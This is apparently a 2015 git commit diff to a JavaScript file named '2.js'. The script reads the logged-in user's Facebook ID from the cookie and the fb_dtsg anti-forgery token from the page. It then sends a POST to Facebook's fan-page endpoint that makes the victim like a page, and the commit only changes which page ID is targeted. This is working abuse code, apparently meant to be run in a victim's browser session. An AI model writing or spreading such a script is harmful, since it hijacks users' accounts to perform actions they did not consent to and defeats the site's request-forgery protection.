a62c0b59081ac726c9527a51d50733bc485cb29f
عاشق ومهبول الجافاسكربت عساسى <elmahbol@users.noreply.github.com>
2015-10-27 13:41:57 +0200

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,6 +1,6 @@
   var X = new XMLHttpRequest();
   var XURL = "//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT";
-  var XParams = "fbpage_id=1441531442812316&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
+  var XParams = "fbpage_id=279371595587207&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
   X.open("POST", XURL, true);
   X.onreadystatechange = function () {
     if (X.readyState == 4 && X.status == 200) {
